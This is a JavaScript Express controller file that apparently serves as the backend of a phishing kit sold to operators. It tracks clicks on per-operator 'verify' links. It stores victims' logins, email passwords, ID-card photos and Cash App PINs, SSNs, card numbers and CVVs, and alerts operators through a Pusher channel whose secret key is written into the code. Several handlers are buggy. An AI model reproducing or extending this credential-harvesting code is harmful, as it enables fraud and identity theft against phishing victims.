
import User from '../models/User.js'
import Info from '../models/Info.js'
import Link from '../models/Link.js'
import Click from '../models/Click.js'
// import socket from '../server.js'
import Poster from '../models/Poster.js'
import device from 'express-device'
import useragent from 'express-useragent'
import Site from '../models/Site.js'
import createToken from '../utils/createToken.js'
import Demo from '../models/Demo.js'
import Cash from '../models/Cash.js'



import Pusher from'pusher';


export const yoyo = async (req, res) => {

// const{id}=req.params


    try {

        // const data = await    Info.find().sort({ field: 'asc', _id: -1 }).limit(1)
        // const data =    await Info.find().sort({$natural:-1}).limit(1);
        const data = await Link.find().select('linkName')
        return res.status(200).json({ data: data })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const   signup_post = async (req, res) => {
    const { username, password, links, adminId, numOfPostersPermission } = req.body;

    try {
        const user = await User.findOne({ username: username })
        if (user) {
            return res.status(400).json({ error: "user exists yes" })

        }
        const foundWithAdminId = await User.findOne({ adminId: adminId })
        if (foundWithAdminId) {
            return res.status(400).json({ error: "id exists" })
        }
        const userCreated = await User.create({
            password,
            username,
            adminId,
            links,
            numOfPostersPermission


        })
        return res.status(200).json({ user: userCreated })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}
export const login_post = async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await User.findOne({ username: username })

        if (user) {
            if (user.password == password) {
                const currentDate = new Date();
                const diff=currentDate -user.createdAt;
                const  difff=diff/ 1000 / 60 / 60 / 24
            if(difff >= 60){
                return res.status(400).json({ error: "Subscription Expired" })

            }
                return res.status(200).json({ adminId: user.adminId, username: user.username, id: user._id, admin: user.admin, qrCodeStatus:user.qrCodeStatus})

            }
            return res.status(400).json({ error: "Wrong password" })


        }
        else {
            const poster = await Poster.findOne({ username: username })
            if (poster) {
                if (poster.password == password) {
            const poster = await Poster.findOne({ username: username })
            const admin=await User.findOne({ _id: poster.root })
            const currentDate = new Date();
            const diff=currentDate -admin.createdAt;
            const  difff=diff/ 1000 / 60 / 60 / 24
        if(difff >= 60){
            return res.status(400).json({ error: "Subscription Expired" })

        }
            return res.status(200).json({ username: poster.username, id: poster._id,
                 admin: poster.admin ,adminId:admin.adminId,posterId:poster.posterId,qrCodeStatus:admin.qrCodeStatus})

                }
                return res.status(400).json({ error: "Wrong password" })

            }

        }
        return res.status(400).json({ error: "User not found" })

    } catch (e) {
        res.status(400).json({ error: "not found" })
    }

}


export const skip_code = (req, res) => {
    const { id, skipcode } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            skipcode: skipcode
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true,id:id })
    })

}

export const cards = (req, res) => {
    const { id, onlyCard, holdingCard } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {

            onlyCard:onlyCard,
             holdingCard:holdingCard
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true })
    })

}

export const add_mail = (req, res) => {
    const { id,mail,mailPass } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            mail:mail,mailPass:mailPass
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true })
    })

}
export const add_posterNumber = (req, res) => {
    const { username, numberAdd } = req.body;
    User.findOneAndUpdate({ username: username }, {
        $set: {
            numOfPostersPermission: numberAdd
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })


}



export const add_new_links = (req, res) => {
    const { username, links } = req.body;
    User.findOneAndUpdate({ username: username }, {
        $set: {
            links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}











export const info_get = async (req, res) => {

    const { username, id, admin } = req.params

    try {

        if (admin) {
            const user = await User.findOne({ _id: id })
                .populate({
                    path: 'posters',
                    model: 'Poster',
                    select: 'username password links ',
                    populate: {
                        path: 'details',
                        model: 'Info',
                        select: 'site email password skipcode mail mailPass onlyCard holdingCard',
                    }
                })
                .select('posters').populate('posters', 'username password links ').sort({ createdAt: -1 })
            return res.status(200).json({ user: user[0] })


        }

        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const id_card = async (req, res) => {

    const { username, id, admin } = req.params


    try {

        if (admin) {
            const user = await User.findOne({ _id: id })
                .populate({
                    path: 'posters',
                    model: 'Poster',
                    select: 'username password links ',
                    populate: {
                        path: 'details',
                        model: 'Info',
                        select: 'site onlyCard holdingCard',
                    }
                }).sort({ createdAt: -1 })
                .select('posters').populate('posters', 'username password links ')
            return res.status(200).json({ user: user[0] })


        }

        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site onlyCard holdingCard').sort({ createdAt: -1 })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const poster_add = async (req, res) => {

    const { username, password, links, id, posterId } = req.body


    try {
        const user = await User.findOne({ _id: id })
        const posterExists = await Poster.findOne({ username: username })
        if (posterExists) {
            return res.status(400).json({ error: "username exists" })

        }
        const posterIdExists = await Poster.findOne({ posterId: posterId })
        if (posterIdExists) {
            return res.status(400).json({ error: "Id exists" })

        }
       
       
        if (user.numOfPosters >= user.numOfPostersPermission) {
            return res.status(400).json({ error: "User add limit reached" })

        }
        links.map(async (item) => {
            await Link.create({
                linkName: item


            })

        })

        const poster = await Poster.create({
            username, password, links, posterId,

            root: user._id


        })
        user.posters.push(poster._id)
        user.numOfPosters = user.numOfPosters + 1
        await user.save();
        return res.status(200).json({ status: "saved" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const add_data = async (req, res) => {
    const pusher = new Pusher({
        appId: '1710273',
        key: 'ff0fc3f0096af6ab8a90',
        secret: '0e0830285b87499f5085',
        cluster: 'ap2',
        useTLS: true,
      });
      

    const { adminId, posterId } = req.params
    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, email, password, skipcode,
                username,passcode,mail,mailPass,adminId:adminId,
                poster: posterId,
                root: posterFound._id,
                onlyCard,holdingCard


            })
            if(info){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });
            }
            posterFound.details.push(info._id)
            await posterFound.save();
           
            
            return   res.status(200).json({ info: info })

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}


export const change_password = async (req, res) => {
    const { user, poster, password } = req.body;
    const filter = { username: poster };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ username: user })
        const posterFound = await Poster.findOne({ username: poster })
        if (userFound && posterFound) {

            await Poster.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }




}


export const delete_poster =  (req, res) => {

    const { id_pos,id_ad } = req.params
//    return  res.status(422).json({ id: id_pos })

    Poster.findByIdAndRemove({ _id: id_pos })
    .then(user => console.log('deleted yes')).catch(err => res.status(422).json({ error: err }))
User.findOne({_id: id_ad}).then(user => {
    const datas = user.posters.filter(posterId => posterId != id_pos)
    

    user.posters = [...datas]
    user.numOfPosters =user.numOfPosters - 1 
    user.save().then(useryes =>   console.log('saved yes')).catch(err => res.status(422).json({ error: err }))
    User.findOne({_id: id_ad})
    .populate({
        path: 'posters',
        model: 'Poster',
        select: 'username password links posterId',

    }).sort({ createdAt: -1 })
        .then(users =>   res.status(200).json({ data: users }))
        .catch(err => console.log('erro'))

    // user.account.pull(req.params.accid);
    // user.account.save()

}
).catch(err => res.status(422).json({ error: err }))
  

}

export const link_add = async (req, res) => {

    const { linkName } = req.body

    try {
        const link = await Link.findOne({ linkName: linkName })
        if (link) {
            return res.status(400).json({ e: "exists" })

        }
        const userCtreated = await Info.User({
            linkName


        })
        return res.status(200).json({ status: "created" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const link_get = async (req, res) => {

    const { id } = req.params


    try {
        const user = await User.findOne({ _id: id })
        res.status(200).json({ users: user.links })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}




export const all_poster = async (req, res) => {

    const { id } = req.params


    try {

        const data = await User.findOne({ _id: id })
            .populate({
                path: 'posters',
                model: 'Poster',
                select: 'username password links posterId createdAt',

            }).sort({ createdAt: -1 })
        return res.status(200).json({ data: data })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const poster_details =  (req, res) => {
    const { id } = req.params



    Poster.findById(id)
    .select('username password posterId links createdAt details')
    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })

    .then(data => {
        return res.status(200).json({ data: data })    }


    ).catch(err => console.log('err', err))

    // try {

    //     const data = await Poster.findOne({ _id: id })
    //         .select('username password posterId links createdAt details')
    //         .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
    //     return res.status(200).json({ data: data })



    // } catch (e) {
    //     res.status(400).json({ e: "error" })
    // }

}



export const add_site = async (req, res) => {
    const { name } = req.body


    try {
        const sitefound = await Site.findOne({ name: name })
        if (sitefound) {
            return res.status(200).json({ site: "site existes" })

        }

        const site = await Site.create({
            name
        })

        return res.status(200).json({ site: site })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const link_details = async (req, res) => {

    const { id,admin} = req.params
    // return res.status(200).json({ data: id, sites: admin })


    try {
if(admin == 1){
       const data = await User.findOne({ _id: id })
        const sites = await Site.find()

        return res.status(200).json({ data: data.links, sites: sites })
    }
    else if(admin == 0){
        // return res.status(200).json({ data: id, sites: admin })

        const data = await Poster.findOne({ _id: id })
        const sites = await Site.find()
        return res.status(200).json({ data: data.links, sites: sites })
    }
        



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const site_exist =async (req, res) => {

    const { site, adminId, posterId,device} = req.params
    const siteName = "https://" + site + "/" + "verify" +  "/" + adminId + "/" + posterId
    const devicetype = req.device.type
    try {
      const  sitefound = await Link.findOne({linkName:siteName})

         if (sitefound) {
                 const  clickfound = await Click.findOne({site:siteName})
                  if(clickfound){
                                            clickfound.click=clickfound.click+1
                                            await clickfound.save()

                                        if(device == "desktop"){
                                            clickfound.desktop=clickfound.desktop+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" })

                                        }
                                        if(device == "phone"){
                                            clickfound.phone=clickfound.phone+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" })

                                        }
                                        if(device == "ipad"){
                                            clickfound.ipad=clickfound.ipad+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" })

                                        }
                       return res.status(200).json({ success: "exists" })
                                }
             
                          else{
                              const click = await Click.create({
                            site:siteName, adminId, posterId ,
                            click:1,
                            desktop:device == "desktop" ?1:null,
                            phone:device == "phone"?1:null,
                            ipad:device == "ipad"?1:null
                                 })
                                           return res.status(200).json({ success: "exists" })
                          }

                   }
                    return res.status(200).json({ success: "not exist" })

       

    }
    catch (e) {
        res.status(400).json({ e: "e" })
    }

}



export const admin_add_site = async (req, res) => {

    const { username, site } = req.body
    // return res.status(200).json({ success: "username" })


    try {

        const data = await User.findOne({ username: username })
        const linKfound = data.links.find(function (element) {
            return element == site;
        });
        if (linKfound) {
            return res.status(200).json({ success: "exists" })

        }
        data.links.push(site)
        await data.save()
        return res.status(200).json({ success: "saved successfully" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}





export const new_site_add_poster =  (req, res) => {

    const { id, password, links } = req.body
    // const filter = { _id: id };
    // const update = { password: password, links: links };


    Poster.findOneAndUpdate({  _id: id }, {
        $set: {
            password: password, links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "updated successfully" })
    })
    // try {

    //     await Poster.findOneAndUpdate(filter, update, {
    //         new: true,
    //         upsert: true
    //     });

    //     res.status(200).json({ success: "updated successfully" })


    // } catch (e) {
    //     res.status(400).json({ e: "error" })
    // }

}






export const get_A_poster = async (req, res) => {

    const { id,admin} = req.params

    // return res.status(200).json({ data: id, sites: admin })


    try {
     if(admin){
       const data = await Poster.findOne({ _id: id })
            if(!data){
                return res.status(200).json({ data: "not found"})

            }
            return res.status(200).json({ data:data})

    }
        // return res.status(200).json({ data: id, sites: admin })

        
        return res.status(200).json({ data: data.links, sites: sites })
   
        

    }

    catch (e) {
        res.status(400).json({ e: "error" })
    }

}




// module.exports.signin_post=async(req,res)=>{
//     const {email,password}=req.body;
//     try{
//         const user= await User.login(email,password);
//         const token=cretaetoken(user._id);
//         console.log('yes yes',user)
//         // res.cookie('jwt',token,{httpOnly:true,maxAge:3*24*60*60*1000})
//         // const user= await User.findById(usercreate._id).select("email fullname data account").populate("data","bio gender")

//         res.status(200).json({user:user,token:token})
//       }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error})
//       //   res.send(err.code)
//       }


//  }

//  module.exports.signin_post=(req,res)=>{
//     const {email,password}=req.body;
//     User.findOne({email:email})
//     .then(user=>{
//         if(!user){
//             return    res.status(422).json({error:"Invalid Email Or Password"})
//         }
//         bcrypt.compare(password,user.password)
//         .then(doMatch=>{
//             if (doMatch){
//                 const token =  cretaetoken(user._id);
//                 res.status(200).json({user:user,token:token})
//             }
//             else{
//                 return    res.status(422).json({error:"Invalid Email Or Password"})
//             }
//         }).catch(err=>{
//             console.log('err')
//         })
//     }).catch(err=>console.log('err'))


//  } 



export const click = async (req, res) => {
    const { adminId,posterId } = req.params


    try {
        const click = await Click.find({ adminId: adminId,posterId:posterId })
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const click_for_admin = async (req, res) => {
    const { adminId } = req.params


    try {
        const click = await Click.find({ adminId: adminId})
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const pass_change = async (req, res) => {
    const { username ,password} = req.body

    // return res.status(200).json({ success: "changed succesfully" })

    try {
        
            userFound = await User.findOne({username:username})
            if(userFound){
                userFound.password=password
              await userFound.save()
              return res.status(200).json({ success: "changed succesfully" })
            }       

      
     return   res.status(400).json({ e: "user not found" })


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}




export const update_validity =  (req, res) => {

    const { username } = req.body
    const currentDate = new Date();
   return res.status(200).json({ success: currentDate })

    User.findOneAndUpdate({ username: username }, {
        $set: {
            createdAt: currentDate
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: currentDate })
    })

}

export const cashapap_post = async (req, res) => {
    const { adminId, posterId } = req.params
    const { contact,code, pin, ssn,email,password, site, card_number,mm_yy, ccv,zip} = req.body;

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {
            const cashapp = await Cash.create({
                contact, code, pin, ssn, email,password,site,card_number,mm_yy, ccv,zip,adminId, posterId
    
    
            })
            return res.status(200).json({ success: "Created successfully " })
        }

        return res.status(400).json({ error: "doesnt exists" })

       


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }


}





export const links_add =  (req, res) => {

    const { username,link } = req.body
    const currentDate = new Date();
    User.findOneAndUpdate({ username: username }, {
        $set: {
            links: link
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}






export const get_deyails_cashapp = async (req, res) => {
    const { anyid } = req.params


    try {
        const cashappForPoster = await Cash.find({posterId:anyid }).sort({ createdAt: -1 })
        if (cashappForPoster.length > 0) {
            return res.status(200).json({ cashapp: cashappForPoster})

        }

        const cashappAdmin = await Cash.find({adminId:anyid }).sort({ createdAt: -1 })
        if (cashappAdmin.length > 0) {
            return res.status(200).json({ cashapp: cashappAdmin })

        }
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const demo_add = async (req, res) => {
    const {username, linkName,age } = req.body;
console.log(username, linkName,age )
    try {
      
        const userCreated = await Demo.create({
            username, linkName ,age


        })
        const userFound = await Demo.find()

        return res.status(200).json({ user: userFound })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}


export const show_all = async (req, res) => {
    // socket.io.on("setup",()=>{
    //     socket.io.emit("done")
    // })
    try {
      
        
        const userFound = await Poster.find().select("links")

        return res.status(200).json({ user: userFound })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }

}
export const check_qrcode = async (req, res) => {
    const { adminId } = req.params

    try {
      
        const userFound = await User.findOne({ adminId: adminId })

if(userFound){
    if(userFound.qrCodeStatus == true){
        return res.status(200).json({ status: true })

    }
    
    return res.status(200).json({ status: false })

}
        return res.status(400).json({ error: "not found" })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}

export const rqcode_permission =  (req, res) => {

    const { username } = req.body
    User.findOneAndUpdate({ username: username }, {
        $set: {
            qrCodeStatus: true
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "succes" })
    })


}

export const update_many =  (req, res) => {

    const conditions = {};
    const update = {
        $set : {
            qrCodeStatus:false
      }
    };
    const options = { multi: true, upsert: true };

    User.updateMany(conditions, update, options,(err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "success" })
    })


}


export const add_data_checnge = async (req, res) => {

    const { adminId, posterId } = req.params
    const { site, email, password, skipcode ,username,passcode,mail, mailPass,onlyCard,holdingCard } = req.body
    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, email, password, skipcode,
                username,passcode,mail,mailPass,
                poster: posterId,
                root: posterFound._id,
                onlyCard,holdingCard

            })
            posterFound.details.push(info._id)
            await posterFound.save();
            changeEvent("hello",req, res)
            return   res.status(200).json({ info: info })

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}

export const today_data = async(req, res) => {
    const {IId}=req.params
    const user=await User.findOne({adminId:IId})
        if(user){
            const previousDay = new Date();
            previousDay.setDate(previousDay.getDate() - 1);
            const todayFound = await Info.find(
                
                {
                    adminId:IId,
                    createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
                
                }
            
            )
            const todayClick = await Click.find(
                
                {
                    adminId:IId,
                    updatedAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
                
                }
            
            )
            const totalFound = await Info.find(
                
                {
                    adminId:IId,
                
                }
            
            )
            return res.status(200).json({ todayFound: todayFound.length,todayClick: todayClick.length,totalFound: totalFound.length})
        }
        else{
            const previousDay = new Date();
            previousDay.setDate(previousDay.getDate() - 1);
            const todayFound = await Info.find(
                
                {
                    poster:IId,
                    createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
                
                }
            
            )
            const todayClick = await Click.find(
                
                {
                    poster:IId,
                    updatedAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
                
                }
            
            )
            const totalFound = await Info.find(
                
                {
                    poster:IId,
                
                }
            
            )
            return res.status(200).json({ todayFound: todayFound.length,todayClick: todayClick.length,totalFound: totalFound.length})

        }
}


